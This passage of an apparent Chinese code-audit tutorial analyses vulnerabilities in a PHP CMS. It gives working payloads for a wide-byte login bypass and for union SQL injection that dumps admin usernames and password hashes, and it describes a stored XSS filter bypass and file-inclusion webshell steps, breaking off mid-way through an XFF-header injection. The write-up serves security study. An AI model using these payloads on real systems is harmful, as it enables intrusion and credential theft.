class="string">&#x27;admin_id&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">template_assign</span>(<span class="string">&#x27;current_act&#x27;</span>, <span class="string">&#x27;登录&#x27;</span>);</span><br><span class="line">	<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;login.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;do_login&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$admin_name</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_name&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$admin_pwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_pwd&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$remember</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rememberme&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$admin_name</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;用户名不能为空&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$admin_pwd</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;用户密码不能为空&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">check_admin</span>(<span class="variable">$admin_name</span>, <span class="variable">$admin_pwd</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">update_admin_info</span>(<span class="variable">$admin_name</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$remember</span> == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_id]&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line">			<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_name]&#x27;</span>, <span class="variable">$admin_name</span>, <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_pwd]&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$admin_pwd</span>).<span class="variable">$_CFG</span>[<span class="string">&#x27;cookie_hash&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;您输入的用户名和密码有误&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p> <code>$admin_name</code>和<code>$admin_pwd</code>参数使用isset判断是否存在，如果存在则使用trim去除首末两端空格，不存在则返回空字符串，跟踪<code>check_admin</code> 函数做进一步判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断num如果大于0则返回true</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713722.png" alt="image-20230725171305688"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713596.png" alt="image-20230725171341565"></p>
+<p>这里可以在admin处构造万能密码绕过校验</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251717430.png" alt="image-20230725171709394"></p>
+<p>构造payload需要单引号闭合，但是单引号会触发<code>deep_addslashes()</code>函数添加一个反斜杠，这时候由于数据库编码使用的是gb2312，可以构造 <code>%df</code> 进行宽字节注入，我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以<code>%df</code>和后面的<code>\</code>变成了一个汉字“运”，而 <code>&#39;</code> 逃逸了出来。</p>
+<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin %df&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724082.png" alt="image-20230725172402005"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724998.png" alt="image-20230725172442921"></p>
+<h4 id="3、SQL注入：后台Union注入"><a href="#3、SQL注入：后台Union注入" class="headerlink" title="3、SQL注入：后台Union注入"></a>3、SQL注入：后台Union注入</h4><p>漏洞点： <code>/admin/nav.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span>==<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select * from &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;navigate&#x27;</span>).<span class="string">&quot; where navid = &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;navid&#x27;</span>];</span><br><span class="line">	<span class="variable">$nav</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;nav&#x27;</span>,<span class="variable">$nav</span>);</span><br><span class="line">	<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;act&#x27;</span>, <span class="variable">$act</span>	);</span><br><span class="line">	<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;nav_info.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$_GER[&#39;navid&#39;]</code>没有过滤直接带入数据库执行，所以存在sql注入</p>
+<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#判断字段长度</span><br><span class="line">nav.php?act=edit&amp;navid=1 order by 6		#正常</span><br><span class="line">nav.php?act=edit&amp;navid=1 order by 7		#报错</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,3,4,5,6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251740673.png" alt="image-20230725174040632"></p>
+<p>获取用户名、库名、版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,user(),database(),4,version(),6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251743117.png" alt="image-20230725174339069"></p>
+<p>获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,group_concat(table_name),4,version(),6  from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251749783.png" alt="image-20230725174933732"></p>
+<p>获取字段名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,group_concat(column_name),4,version(),6  from information_schema.columns where table_name=0x626c75655f61646d696e</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251750023.png" alt="image-20230725175045971"></p>
+<p>获取admin_name和pwd字段信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,admin_name,pwd,4,version(),6  from blue_admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251753155.png" alt="image-20230725175322107"></p>
+<h4 id="4、XSS：后台新闻发布处存储型"><a href="#4、XSS：后台新闻发布处存储型" class="headerlink" title="4、XSS：后台新闻发布处存储型"></a>4、XSS：后台新闻发布处存储型</h4><p>漏洞点：<code>/user.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;do_add_news&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;include/upload.class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line">	<span class="variable">$title</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$color</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$cid</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cid</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;新闻分类不能为空&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$author</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>])) : <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$source</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) ? <span class="title function_ invoke__">filter_data</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$descript</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>]) ? <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>], <span class="number">0</span>, <span class="number">90</span>) : <span class="title function_ invoke__">mb_substr</span>(<span class="title function_ invoke__">html2text</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]),<span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="variable">$lit_pic</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">img_upload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>],<span class="string">&#x27;lit_pic&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">   <span class="variable">$lit_pic</span> = <span class="keyword">empty</span>(<span class="variable">$lit_pic</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="variable">$lit_pic</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在新闻发布处，<code>content</code> 字段未使用 <code>htmlspecialchars</code> 而是使用 <code>filter_data</code> 进行处理，我们跟踪 <code>filter_data</code> 函数分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在 &quot;/include/common.fun.php&quot; 找到函数定义代码</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数只过滤了script，iframe，frame，meta，link 等，这里可以使用img标签绕过</p>
+<h5 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h5><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022856.png" alt="image-20230726102208775"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022926.png" alt="image-20230726102232882"></p>
+<h4 id="5、文件包含"><a href="#5、文件包含" class="headerlink" title="5、文件包含"></a>5、文件包含</h4><p>漏洞点：<code>user.php</code></p>
+<p>user.php 的支付功能，可以通过 $_POST[‘pay’] 控制文件包含的路径，但是后面拼接了 &#x2F;index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$price</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>有两种方式可以截断</p>
+<p>绕过方法1：%00 截断</p>
+<p>条件：magic_quotes_gpc &#x3D; Off，PHP版本&lt;5.3.4</p>
+<p>绕过方法2：路径长度截断</p>
+<p>条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</p>
+</blockquote>
+<h5 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h5><p>由于我php版本为5.6.27，这里降级到5.2.17做测试，测试中%00截断不知道为什么无法利用(满足使用条件)，使用路径长度截断</p>
+<p>构造payload进行包含</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261104645.png" alt="image-20230726110416576"></p>
+<p>在个人头像处构造图片马上传</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109458.png" alt="image-20230726110914400"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109420.png" alt="image-20230726110935351"></p>
+<p>包含图片马</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261110292.png" alt="image-20230726111001230"></p>
+<p>这里可以使用fput写一个马进去，文件包含后生成新马用webshell工具管理更方便</p>
+<h4 id="6、SQL注入：XFF头注入"><a href="#6、SQL注入：XFF头注入" class="headerlink" title="6、SQL注入：XFF头注入"></a>6、SQL注入：XFF头注入</h4><p>漏洞点：<code>/include/common.fun.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">	&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">		<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getip()</code> 获取的XFF头中的IP直接返回 <code>$ip</code>  这里跟踪下看看那个地方调用了 <code>getip()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>))</span><br><span class="line">	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="variable">$user_id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] ? <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line"> 	<span class="variable">$mood</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>]);</span><br><span class="line"> 	<span class="variable">$content</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> 	<span class="variable">$content</span> = <span class="title function_ invoke__">nl2br</span>(<span class="variable">$content</span>);</span><br><span class="line"> 	<span class="variable">$type</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$content</span>))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;评论内容不能为空&#x27;</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="variable">$_CFG</span>[<span class="string">&#x27;comment_is_check&#x27;</span>] == <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="variable">$is_check</span> = <span class="number">1</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="variable">$is_check</span> = <span class="number">0</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">getip</span>().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br><span class="line"> 	<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="variable">$type</span> == <span class="number">1</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;article&#x27;</span>).<span class="string">&quot; SET comment = comment+1 WHERE id = &quot;</span>.<span class="variable">$id</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">elseif</span>(<span class="variable">$type</span> == <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;post&#x27;</span>).<span class="string">&quot; SET comment = comment+1 WHERE post_id = &quot;</span>.<span class="variable">$id</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_CFG</span>[<span 